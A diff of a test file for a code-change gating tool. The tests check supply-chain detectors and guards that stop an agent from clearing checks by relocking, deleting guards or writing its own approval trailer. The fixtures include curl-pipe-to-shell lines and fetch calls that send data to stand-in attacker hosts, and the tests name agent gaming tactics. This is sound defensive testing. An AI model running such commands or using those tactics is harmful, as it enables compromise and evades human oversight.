@@ -509,6 +509,240 @@ test('init --preset security: the pack is copied from the package into .promptwh
   rmSync(d, { recursive: true, force: true }); rmSync(d2, { recursive: true, force: true });
 });
 
+// ------------------------------------------- supply-chain pack + preset (paths and counts, held)
+const SC_SCAN = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'scan.mjs');
+const scan = (what, dir) => { try { return { out: execFileSync('node', [SC_SCAN, what, dir], { encoding: 'utf8' }).trim(), code: 0 }; } catch (e) { return { out: `${e.stdout || ''}${e.stderr || ''}`, code: e.status }; } };
+
+test('supply-chain pack: unpinned execution and install policy are counted, pinned references are not', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-sc-pin-'));
+  mkdirSync(join(d, '.github/workflows'), { recursive: true }); mkdirSync(join(d, 'scripts'));
+  const sha = 'a'.repeat(40);
+  writeFileSync(join(d, '.github/workflows/ci.yml'), ['jobs:', '  a:', '    steps:', '      - uses: actions/checkout@v4', `      - uses: actions/setup-node@${sha}`, '      - uses: ./local-action', '      # - uses: commented/out@v1', '      - run: npx -y sawbuck debt', '      - run: npx -y sawbuck@0.1.32 debt', '      - run: curl -s https://x.example/i.sh | bash', '      - run: npm install -g tool'].join('\n'));
+  writeFileSync(join(d, 'action.yml'), 'runs:\n  steps:\n    - run: pnpm dlx thing@latest\n');
+  writeFileSync(join(d, 'package.json'), JSON.stringify({ devDependencies: { tsc: '1' }, scripts: { b: 'npx tsc', c: 'npx cowsay' } }));
+  writeFileSync(join(d, 'scripts/go.sh'), '#!/bin/sh\n# npx comment\nnpx --yes @scope/pkg@1.2.3\n');
+  assert.equal(scan('unpinned', d).out, '6', 'tag action, npx, curl pipe, global install, dlx latest, undeclared npx');
+  assert.equal(scan('policy', d).out, '2');
+  writeFileSync(join(d, '.npmrc'), 'ignore-scripts=true\nmin-release-age=3\n');
+  assert.equal(scan('policy', d).out, '0');
+});
+
+test('lock: the same tree writes the same bytes, ordinary edits do not drift, structure does', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-lock-'));
+  execFileSync('git', ['init', '-q'], { cwd: d });
+  mkdirSync(join(d, 'src/api'), { recursive: true }); mkdirSync(join(d, 'src/db')); mkdirSync(join(d, 'src/auth')); mkdirSync(join(d, 'src/app/billing'), { recursive: true }); mkdirSync(join(d, '.github/workflows'), { recursive: true }); mkdirSync(join(d, 'test'));
+  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', bin: { a: 'x.js' }, exports: { '.': './x.js' }, dependencies: { left: '1' } }));
+  writeFileSync(join(d, 'src/api/h.js'), "import { q } from '../db/q.js';\napp.get('/users', h);\nconst u = 'https://api.stripe.com/v1';\n// see https://in-a-comment.dev/x\n");
+  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 1;\n');
+  writeFileSync(join(d, 'src/auth/a.js'), 'export const a = 1;\n');
+  writeFileSync(join(d, 'src/app/billing/route.ts'), 'export const GET = 1;\n');
+  writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\n');
+  writeFileSync(join(d, 'test/h.test.js'), "fetch('https://only-in-a-test.dev/')\n");
+  const lockTool = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'lock.mjs');
+  const write = () => execFileSync('node', [lockTool, 'write', d], { encoding: 'utf8' });
+  const drift = () => execFileSync('node', [lockTool, 'drift', d], { encoding: 'utf8' }).trim();
+  write(); const first = readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'); write();
+  assert.equal(readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'), first, 'no timestamp: deterministic bytes');
+  const items = JSON.parse(first).items;
+  for (const i of ['dep:left', 'entry:bin:a', 'entry:export:.', 'workflow:.github/workflows/ci.yml', 'module:src/api', 'edge:src/api>src/db', 'route:GET /users', 'route:/billing', 'host:api.stripe.com']) assert.ok(items.includes(i), i);
+  assert.ok(!items.some((i) => /in-a-comment|only-in-a-test/.test(i)), 'comments and tests add no hosts');
+  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 2; // an ordinary edit\n');
+  assert.equal(drift(), '0');
+  writeFileSync(join(d, 'src/db/q.js'), "import { a } from '../auth/a.js';\nexport const q = fetch('https://evil.example.net/x?e=' + a);\n");
+  assert.equal(drift(), '2', 'the new edge and first network use; example.net is reserved and not a host');
+  writeFileSync(join(d, 'src/db/q.js'), "export const q = fetch('https://exfil.attacker.dev/x');\n");
+  assert.equal(drift(), '2', 'the new host and first network use');
+  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 2;\n');
+  mkdirSync(join(d, 'src/app/reports'));
+  writeFileSync(join(d, 'src/app/reports/route.ts'), 'export const GET = 1;\n');
+  assert.equal(drift(), '0', 'a new route is reported, not held');
+  assert.equal(execFileSync('node', [lockTool, 'drift', d, '--routes'], { encoding: 'utf8' }).trim(), '1', 'unless the repo asks');
+});
+
+test('lock: versions, script bodies, capabilities, binaries and IP hosts drift; a release of the project itself does not', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-lock2-'));
+  execFileSync('git', ['init', '-q'], { cwd: d }); mkdirSync(join(d, 'src'));
+  const lock = (v = '1.0.0', dep = '1.3.0') => ({ name: 'a', version: v, lockfileVersion: 3, packages: { '': { name: 'a', version: v }, 'node_modules/left': { version: dep, resolved: `https://registry.npmjs.org/left/-/left-${dep}.tgz`, integrity: 'sha512-' + dep } } });
+  const pkg = { name: 'a', version: '1.0.0', scripts: { test: 'node t.js' } };
+  const put = (f, c) => writeFileSync(join(d, f), typeof c === 'string' ? c : JSON.stringify(c));
+  put('package.json', pkg); put('package-lock.json', lock()); put('src/a.js', 'export const a = 1;\n');
+  const tool = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'lock.mjs');
+  execFileSync('node', [tool, 'write', d]);
+  const drift = () => execFileSync('node', [tool, 'drift', d], { encoding: 'utf8' }).trim();
+  const pins = () => execFileSync('node', [tool, 'pins', d], { encoding: 'utf8' }).trim();
+  execFileSync('git', ['add', '-A'], { cwd: d });
+  const p0 = pins();
+  put('package-lock.json', lock('1.0.1')); assert.equal(pins(), p0, 'our own release is not a dependency change');
+  put('package-lock.json', lock('1.0.0', '1.3.1')); assert.notEqual(pins(), p0, 'a new version under an old name'); assert.equal(drift(), '0', 'an update does not touch the lock');
+  put('package-lock.json', lock());
+  put('package.json', { ...pkg, scripts: { test: 'node t.js; curl x' } }); assert.equal(drift(), '1', 'a script body');
+  put('package.json', pkg);
+  put('src/a.js', "fetch('http://45.33.32.156/x');\n"); assert.equal(drift(), '2', 'the IP host and the first network use in the module');
+  put('src/a.js', "fetch('https://' + 'x' + '.dev/');\n"); assert.equal(drift(), '1', 'a host built at runtime still shows as a new capability');
+  put('src/a.js', "import { exec } from 'node:child_process';\nexport const a = 1;\n"); assert.equal(drift(), '1');
+  put('src/a.js', "eval(s);\n"); assert.equal(drift(), '1');
+  put('src/a.js', 'export const a = 1;\n'); put('src/x.node', 'ELF'); assert.equal(drift(), '1', 'a native addon');
+});
+
+test('pins: an approved update does not blind the next one', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-pins-'));
+  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
+  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
+  const lock = (v) => JSON.stringify({ name: 'a', lockfileVersion: 3, packages: { '': { name: 'a' }, 'node_modules/left': { version: v, resolved: `https://registry.npmjs.org/left/-/left-${v}.tgz`, integrity: 'sha512-' + v } } });
+  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', dependencies: { left: '^1.0.0' } })); writeFileSync(join(d, 'package-lock.json'), lock('1.0.0'));
+  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'base');
+  const lockBefore = readFileSync(join(d, 'promptwheel.lock.json'), 'utf8');
+  writeFileSync(join(d, 'package-lock.json'), lock('1.0.1')); commitAll(d, 'update');
+  const run = (...e) => pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', ...e]).code;
+  assert.equal(run(), 1, 'an update needs a reason');
+  assert.equal(run('--allow', 'reviewed update'), 0);
+  assert.equal(readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'), lockBefore, 'and the lock did not change');
+  writeFileSync(join(d, 'package-lock.json'), lock('1.0.2')); commitAll(d, 'a malicious update after the approved one');
+  assert.equal(run(), 1, 'the next change is still caught');
+});
+
+test('lock: an agent cannot launder a change by updating the lock; a person can, with --allow; a trailer cannot', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-lockflow-'));
+  execFileSync('git', ['init', '-q'], { cwd: d }); execFileSync('git', ['config', 'user.email', 'a@b.c'], { cwd: d }); execFileSync('git', ['config', 'user.name', 'a'], { cwd: d });
+  mkdirSync(join(d, 'src'));
+  writeFileSync(join(d, 'src/a.js'), 'export const a = 1;\n');
+  const pkg = { name: 'x', dependencies: { left: '1.0.0' } };
+  writeFileSync(join(d, 'package.json'), JSON.stringify(pkg));
+  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0);
+  assert.ok(existsSync(join(d, 'promptwheel.lock.json')), 'init writes the lock');
+  commitAll(d, 'contract');
+  const relock = () => assert.equal(pw(d, ['lock']).code, 0);
+  writeFileSync(join(d, 'package.json'), JSON.stringify({ ...pkg, dependencies: { ...pkg.dependencies, evil: '1.0.0' } }));
+  relock();
+  // the drift reads 0 (the lock was updated) and the dependency count is the only other signal; the mandate catches the lock edit
+  let r = pw(d, ['run', '--working', '--no-record', '--json']);
+  assert.equal(r.code, 1, r.out);
+  const rep = JSON.parse(r.out.slice(r.out.indexOf('{')));
+  assert.ok(rep.mandates.some((m) => m.name === 'lock-frozen'), 'the lock edit is the violation');
+  commitAll(d, 'add evil and relock\n\nPromptwheel-Allow: an agent approving itself');
+  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
+  assert.equal(r.code, 1, 'a trailer clears neither the mandate nor the guards');
+  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'reviewed: needed for X']);
+  assert.equal(r.code, 0, r.out);
+  assert.ok(JSON.parse(r.out).allowed.cleared.includes('mandate:lock-frozen'));
+});
+
+test('supply-chain pack: the three counters on fixtures (manifests; npm, pnpm, yarn classic and yarn berry locks)', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-sc-scan-'));
+  mkdirSync(join(d, 'packages/a'), { recursive: true }); mkdirSync(join(d, 'node_modules/x'), { recursive: true }); mkdirSync(join(d, 'berry'));
+  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'root', dependencies: { 'left-pad': '^1', lodash: '^4' }, scripts: { test: 'node t.mjs', build: 'echo', prepare: '' } }));
+  writeFileSync(join(d, 'packages/a/package.json'), JSON.stringify({ name: 'a', devDependencies: { vitest: '^1' }, scripts: { postinstall: 'node evil.js', prepare: 'husky' } }));
+  writeFileSync(join(d, 'node_modules/x/package.json'), JSON.stringify({ scripts: { postinstall: 'x' }, dependencies: { q: '1' } }));   // never walked
+  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: {
+    '': { name: 'root' },
+    'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-abc' },
+    'node_modules/lodash': { version: '4.17.21', resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz' },             // registry, no integrity
+    'node_modules/evil': { version: '1.0.0', resolved: 'git+ssh://git@github.com/x/evil.git#deadbeef' },                           // git
+    'node_modules/a': { resolved: 'packages/a', link: true },                                                                       // a workspace link is not a source
+    'packages/a': { name: 'a', version: '1.0.0' } } }));
+  writeFileSync(join(d, 'packages/a/pnpm-lock.yaml'), "lockfileVersion: '9.0'\npackages:\n  lodash@4.17.21:\n    resolution: {integrity: sha512-abc}\n  evil@1.0.0:\n    resolution: {tarball: https://github.com/x/evil/archive/main.tar.gz}\n  other@1.0.0:\n    resolution: {commit: deadbeef, repo: git@github.com:x/other.git, type: git}\n");
+  writeFileSync(join(d, 'yarn.lock'), '# yarn lockfile v1\n\nleft-pad@^1.0.0:\n  version "1.3.0"\n  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#abc"\n  integrity sha512-abc\n\nlodash@^4:\n  version "4.17.21"\n  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#def"\n\nevil@github:x/evil:\n  version "1.0.0"\n  resolved "https://codeload.github.com/x/evil/tar.gz/deadbeef"\n');
+  writeFileSync(join(d, 'berry/yarn.lock'), '__metadata:\n  version: 8\n\n"left-pad@npm:^1.0.0":\n  version: 1.3.0\n  resolution: "left-pad@npm:1.3.0"\n  checksum: abc\n\n"a@workspace:packages/a":\n  version: 0.0.0-use.local\n  resolution: "a@workspace:packages/a"\n\n"evil@https://github.com/x/evil.git#commit=deadbeef":\n  version: 1.0.0\n  resolution: "evil@https://github.com/x/evil.git#commit=deadbeef"\n');
+  assert.equal(scan('lifecycle', d).out, '2', 'postinstall + a non-empty prepare; an empty prepare and node_modules do not count');
+  assert.equal(scan('deps', d).out, '3', 'two root dependencies + one nested devDependency');
+  assert.equal(scan('lock-sources', d).out, '7', 'npm: git + no integrity (the link skipped); pnpm: tarball + commit; yarn classic: codeload + no integrity; berry: git');
+  assert.equal(scan('nope', d).code, 64, 'a typo in the config reads as unmeasurable, never as a clean 0');
+  rmSync(d, { recursive: true, force: true });
+});
+
+test('init --preset supply-chain: the held counts, the lock, the mandates, the contract as an evaluatorPath, the pack copied once', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-sc-init-'));
+  const g = (a) => execFileSync('git', a, { cwd: d });
+  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
+  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'demo', scripts: { test: 'node -e 0' }, dependencies: {} }, null, 2) + '\n');
+  commitAll(d, 'base');
+  const r = pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']);
+  assert.equal(r.code, 0, r.out);
+  assert.equal((r.out.match(/installed packs\/supply-chain/g) || []).length, 1, 'one pack, announced once, however many metrics run it');
+  assert.match(pw(d, ['init', '--list']).out, /supply-chain\s+gate: no new lifecycle scripts/);
+  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
+  assert.deepEqual(cfg.metrics.map((m) => m.name), ['lifecycle_scripts', 'dependency_entries', 'lock_nonregistry_sources', 'unpinned_execution', 'install_policy_gaps', 'lock_drift', 'pins_changed']);
+  assert.ok(cfg.metrics.every((m) => m.guard === true && m.gamingCheck === false && m.allowable === 'flag' && m.cmd.startsWith('node .promptwheel/packs/supply-chain/')), JSON.stringify(cfg.metrics));
+  assert.deepEqual(cfg.mandates.map((m) => m.name), ['workflows-frozen', 'registry-config-frozen', 'build-images-frozen', 'publish-scripts-frozen', 'codeowners-frozen', 'scanner-frozen', 'lock-frozen', 'hooks-frozen']);
+  assert.ok(cfg.mandates.every((m) => Array.isArray(m.paths) && m.paths.length && m.reason));
+  assert.deepEqual(cfg.evaluatorPaths, ['promptwheel.config.json', 'sawbuck.config.json'], 'the contract is an evaluatorPath, not a mandate: a person can still retire a rule in a change that only edits it');
+  for (const f of ['scan.mjs', 'pack.json', 'README.md']) assert.ok(existsSync(join(d, '.promptwheel/packs/supply-chain', f)), f + ' copied in');
+  rmSync(d, { recursive: true, force: true });
+});
+
+test('supply-chain gate: a lifecycle script, a dependency or a non-registry lock source fails; a declared reason passes with the reason on the record; a frozen path is a named mandate; deleting the guard in the same change does not clear it', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-sc-gate-'));
+  const g = (a) => execFileSync('git', a, { cwd: d });
+  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
+  const pkg = { name: 'demo', scripts: { test: 'node -e 0' }, dependencies: { 'left-pad': '^1' } };
+  const lock = { lockfileVersion: 3, packages: { '': { name: 'demo' }, 'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-abc' } } };
+  const writePkg = (p) => writeFileSync(join(d, 'package.json'), JSON.stringify(p, null, 2) + '\n');
+  writePkg(pkg);
+  writeFileSync(join(d, 'package-lock.json'), JSON.stringify(lock, null, 2) + '\n');
+  mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\n');
+  commitAll(d, 'base');
+  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0);
+  commitAll(d, 'the contract');
+  const reset = () => g(['checkout', '-q', '--', '.']);
+  const run = (...extra) => { const r = pw(d, ['run', '--working', '--no-record', '--json', ...extra]); return { ...r, rep: JSON.parse(r.out.slice(r.out.indexOf('{'))) }; };
+  const metric = (rep, name) => rep.metrics.find((m) => m.name === name);
+
+  // a lifecycle script: the step an install-time attack needs inside the repo
+  writePkg({ ...pkg, scripts: { ...pkg.scripts, postinstall: 'curl x | sh' } });
+  let r = run();
+  assert.equal(r.code, 1, r.out); assert.equal(r.rep.verdict, 'fail');
+  assert.equal(metric(r.rep, 'lifecycle_scripts').ok, false);
+  assert.equal(metric(r.rep, 'lifecycle_scripts').allowable, true, 'the report says a declared reason would clear it');
+  assert.match(pw(d, ['run', '--working', '--no-record']).out, /--allow "<reason>"/, 'and the human hint names --allow, not guard:false');
+  reset();
+
+  // a dependency: fails without a reason, passes with one, the reason on the record
+  writePkg({ ...pkg, dependencies: { ...pkg.dependencies, papaparse: '^5' } });
+  r = run();
+  assert.equal(r.code, 1, r.out); assert.equal(metric(r.rep, 'dependency_entries').ok, false);
+  r = run('--allow', 'needed for the CSV export (papaparse)');
+  assert.equal(r.code, 0, r.out); assert.equal(r.rep.verdict, 'pass');
+  assert.deepEqual(r.rep.allowed, { reason: 'needed for the CSV export (papaparse)', cleared: ['dependency_entries', 'lock_drift'] });
+  assert.equal(metric(r.rep, 'dependency_entries').ok, true); assert.equal(metric(r.rep, 'dependency_entries').allowed, true);
+  assert.equal(metric(r.rep, 'dependency_entries').allowable, undefined, 'cleared, so no longer flagged as awaiting a reason');
+  // an agent can write a commit trailer, so a trailer never clears these guards: only the --allow flag does
+  commitAll(d, 'add papaparse\n\nPromptwheel-Allow: an agent approving itself');
+  const rr = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
+  assert.equal(rr.code, 1, rr.out);
+  assert.equal(JSON.parse(rr.out).allowed, undefined);
+  const rf = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'a person read it']);
+  assert.equal(rf.code, 0, rf.out);
+  g(['reset', '-q', '--hard', 'HEAD~1']);
+
+  // a non-registry lock source
+  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ ...lock, packages: { ...lock.packages, 'node_modules/evil': { version: '1.0.0', resolved: 'git+ssh://git@github.com/x/evil.git#deadbeef' } } }, null, 2) + '\n');
+  r = run();
+  assert.equal(r.code, 1, r.out); assert.equal(metric(r.rep, 'lock_nonregistry_sources').ok, false);
+  reset();
+
+  // a frozen path: a named mandate, before any metric is read
+  writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\non: push\nsteps: [{ run: "curl x | sh" }]\n');
+  r = run();
+  assert.equal(r.code, 1, r.out); assert.equal(r.rep.verdict, 'fail');
+  assert.equal(r.rep.mandates[0].name, 'workflows-frozen'); assert.ok(r.rep.mandates[0].files.includes('.github/workflows/ci.yml'));
+  reset();
+
+  // deleting the lifecycle guard in the same change that adds the script: the committed contract holds
+  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
+  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, metrics: cfg.metrics.filter((m) => m.name !== 'lifecycle_scripts') }, null, 2) + '\n');
+  writePkg({ ...pkg, scripts: { ...pkg.scripts, postinstall: 'curl x | sh' } });
+  r = run();
+  assert.notEqual(r.rep.verdict, 'pass', r.out);
+  assert.ok(r.rep.gate && Array.isArray(r.rep.gate.weakened) && r.rep.gate.weakened.some((w) => w.name === 'lifecycle_scripts'), 'the dropped guard is re-measured under its committed definition: ' + JSON.stringify(r.rep.gate));
+  reset();
+
+  // a change that only edits the contract (a person retiring a rule) still passes
+  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, repeat: 2 }, null, 2) + '\n');
+  r = run();
+  assert.equal(r.code, 0, r.out);
+  rmSync(d, { recursive: true, force: true });
+});
+
 // ---------------------- the newcomer's first cheat: gut the tests, metric stays flat
 test('default init config: weakening the suite (flat metric) FAILS via tripwires', () => {
   const d = mkdtempSync(join(tmpdir(), 'pw-gut-'));
@@ -1260,6 +1494,30 @@ test('Sawbuck-Allow (alias): covers an intentional test DELETE (not just an edit
   assert.ok(r.allowed, 'the delete was acknowledged');
   rmSync(d, { recursive: true, force: true });
 });
+test('allowTrailer: false and PROMPTWHEEL_NO_ALLOW_TRAILER stop a trailer clearing a gamed win; the flag still does', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-notrailer-'));
+  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
+  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
+  const cfg = { repeat: 1, metrics: [{ name: 'ok', cmd: 'node check.test.mjs', extract: 'exit', direction: 'pass', guard: true }] };
+  writeFileSync(join(d, 'check.test.mjs'), 'process.exit(1);\n');
+  writeFileSync(join(d, 'src.js'), 'export const a = 1;\n');
+  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
+  commitAll(d, 'base');
+  writeFileSync(join(d, 'check.test.mjs'), 'process.exit(0);\n');
+  commitAll(d, 'the test now passes\n\nPromptwheel-Allow: an agent approving itself');
+  const run = (extra = [], env = {}) => { try { return { code: 0, out: execFileSync('node', [ENGINE, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', ...extra], { cwd: d, encoding: 'utf8', env: { ...process.env, ...env }, stdio: ['ignore', 'pipe', 'ignore'] }) }; } catch (e) { return { code: e.status, out: String(e.stdout) }; } };
+  assert.equal(run().code, 0, 'the default keeps the documented trailer');
+  assert.equal(run([], { PROMPTWHEEL_NO_ALLOW_TRAILER: '1' }).code, 2, 'off by the caller: gamed');
+  assert.equal(run(['--allow', 'a person read it'], { PROMPTWHEEL_NO_ALLOW_TRAILER: '1' }).code, 0, 'the flag still counts');
+  // off by the contract at the base ref; a change that re-enables it in the same diff does not get the trailer
+  g(['reset', '-q', '--hard', 'HEAD~1']);
+  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, allowTrailer: false })); commitAll(d, 'contract: trailers off');
+  writeFileSync(join(d, 'check.test.mjs'), 'process.exit(0);\n');
+  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
+  commitAll(d, 'pass, and trailers back on\n\nPromptwheel-Allow: an agent approving itself');
+  assert.notEqual(run().code, 0, 'the committed contract holds');
+});
+
 test('Promptwheel-Allow: a trailer with no reason does NOT override (still gamed); the retired Allow-Gamed name is not honored', () => {
   const d = gamedRepo();
   commitAll(d, 'edit\n\nPromptwheel-Allow:   ');   // empty reason
